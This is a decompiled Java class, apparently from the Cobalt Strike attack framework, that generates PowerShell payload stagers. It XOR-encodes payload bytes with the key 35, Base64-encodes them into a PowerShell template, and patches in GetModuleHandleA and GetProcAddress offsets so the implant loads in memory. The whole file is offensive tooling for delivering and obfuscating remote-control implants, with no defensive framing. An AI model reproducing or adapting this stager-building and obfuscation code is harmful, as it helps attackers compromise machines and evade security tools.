package common;

import aggressor.AggressorClient;
import encoders.Base64;
import java.io.IOException;
import java.io.InputStream;
import pe.BeaconLoader;

public class ResourceUtils extends BaseResourceUtils {
   public ResourceUtils(AggressorClient var1) {
      super(var1);
   }

   public byte[] _buildPowerShellHint(byte[] var1, String var2) throws IOException {
      InputStream var3 = CommonUtils.resource("resources/template.hint." + var2 + ".ps1");
      byte[] var4 = CommonUtils.readAll(var3);
      var3.close();
      String var5 = CommonUtils.bString(var4);
      int var6 = BeaconLoader.getLoaderHint(var1, var2, "GetModuleHandleA");
      int var7 = BeaconLoader.getLoaderHint(var1, var2, "GetProcAddress");
      AssertUtils.Test(var6 >= 0, "GetModuleHandleA hint for " + var2 + " was not found. Your PowerShell script will crash.");
      AssertUtils.Test(var7 >= 0, "GetProcAddress hint for " + var2 + " was not found. Your PowerShell script will crash.");
      byte[] var8 = new byte[]{35};
      var1 = CommonUtils.XorString(var1, var8);
      var5 = CommonUtils.strrep(var5, "%%DATA%%", Base64.encode(var1));
      var5 = CommonUtils.strrep(var5, "%%GMH_OFFSET%%", var6 + "");
      var5 = CommonUtils.strrep(var5, "%%GPA_OFFSET%%", var7 + "");
      return CommonUtils.toBytes(var5);
   }

   public byte[] _buildPowerShellNoHint(byte[] var1, String var2) throws IOException {
      InputStream var3 = CommonUtils.resource("resources/template." + var2 + ".ps1");
      byte[] var4 = CommonUtils.readAll(var3);
      var3.close();
      String var5 = CommonUtils.bString(var4);
      byte[] var6 = new byte[]{35};
      var1 = CommonUtils.XorString(var1, var6);
      var5 = CommonUtils.strrep(var5, "%%DATA%%", Base64.encode(var1));
      return CommonUtils.toBytes(var5);
   }

   public byte[] _buildPowerShell(byte[] var1, boolean var2) {
      try {
         String var3 = CommonUtils.arch(var2);
         return BeaconLoader.hasLoaderHint(this.client, var1, var3) ? this._buildPowerShellHint(var1, var3) : this._buildPowerShellNoHint(var1, var3);
      } catch (IOException var4) {
         MudgeSanity.logException("buildPowerShell", var4, false);
         return new byte[0];
      }
   }
}
